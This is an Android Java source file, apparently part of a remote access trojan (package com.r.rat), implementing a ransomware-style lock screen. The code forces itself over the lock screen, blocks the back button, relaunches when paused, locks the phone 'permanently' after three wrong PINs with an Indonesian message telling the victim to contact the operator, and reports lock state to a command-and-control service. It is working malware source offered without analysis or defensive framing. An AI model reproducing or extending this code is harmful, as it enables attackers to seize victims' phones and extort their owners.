package com.r.rat;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;
public class LockActivity extends Activity {
    private static LockActivity INSTANCE;
    private TextView status;
    private View[] dots;
    private StringBuilder buf = new StringBuilder();
    private boolean perm = false;
    private BroadcastReceiver rx;
    public static void finishGlobal() { if (INSTANCE != null) INSTANCE.finish(); }
    public static void clearPermanent() {
        if (INSTANCE != null) { INSTANCE.perm = false; INSTANCE.runOnUiThread(INSTANCE::refreshUi); }
    }
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        INSTANCE = this;
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        setContentView(R.layout.lock_screen);
        status = findViewById(R.id.status);
        dots = new View[]{ findViewById(R.id.dot1), findViewById(R.id.dot2),
                           findViewById(R.id.dot3), findViewById(R.id.dot4) };
        int[] numIds = {R.id.btn0,R.id.btn1,R.id.btn2,R.id.btn3,R.id.btn4,
                        R.id.btn5,R.id.btn6,R.id.btn7,R.id.btn8,R.id.btn9};
        for (int i = 0; i < numIds.length; i++) {
            final String digit = String.valueOf(i);
            findViewById(numIds[i]).setOnClickListener(v -> press(digit));
        }
        findViewById(R.id.btn_clear).setOnClickListener(v -> backspace());
        findViewById(R.id.btn_enter).setOnClickListener(v -> trySubmit());
        perm = getSharedPreferences("lock", MODE_PRIVATE).getBoolean("perm", false);
        refreshUi();
        rx = new BroadcastReceiver() {
            @Override public void onReceive(Context c, Intent i) { finish(); }
        };
        registerReceiver(rx, new IntentFilter("com.r.rat.UNLOCK"));
    }
    private void press(String d) {
        if (perm || buf.length() >= 4) return;
        buf.append(d); refreshUi();
    }
    private void backspace() {
        if (perm || buf.length() == 0) return;
        buf.setLength(buf.length() - 1); refreshUi();
    }
    private void trySubmit() {
        if (perm) return;
        if (buf.length() != 4) { status.setText("MASUKKAN 4 DIGIT"); return; }
        if (LockController.checkPin(this, buf.toString())) {
            getSharedPreferences("lock", MODE_PRIVATE).edit().putBoolean("active", false).apply();
            finish(); return;
        }
        int a = LockController.incrementAttempt(this);
        buf.setLength(0);
        if (a >= 3) { perm = true; C2Service.reportLockState("permanent", a); }
        else { C2Service.reportLockState("wrong", a); }
        refreshUi();
    }
    private void refreshUi() {
        for (int i = 0; i < 4; i++)
            dots[i].setBackgroundResource(i < buf.length() ? R.drawable.dot_filled : R.drawable.dot_empty);
        if (perm) {
            status.setText("TERKUNCI PERMANEN - hubungi operator");
        } else {
            int a = getSharedPreferences("lock", MODE_PRIVATE).getInt("attempts", 0);
            if (buf.length() < 4) status.setText("MASUKKAN PIN");
            else status.setText("TEKAN \u2713 UNTUK LANJUT");
            if (a > 0) status.append("  (" + a + "/3)");
        }
    }
    @Override public void onBackPressed() {}
    @Override protected void onPause() {
        super.onPause();
        if (getSharedPreferences("lock", MODE_PRIVATE).getBoolean("active", false))
            startActivity(new Intent(this, LockActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }
    @Override protected void onDestroy() {
        if (rx != null) try { unregisterReceiver(rx); } catch (Exception ignored) {}
        if (INSTANCE == this) INSTANCE = null;
        super.onDestroy();
    }
}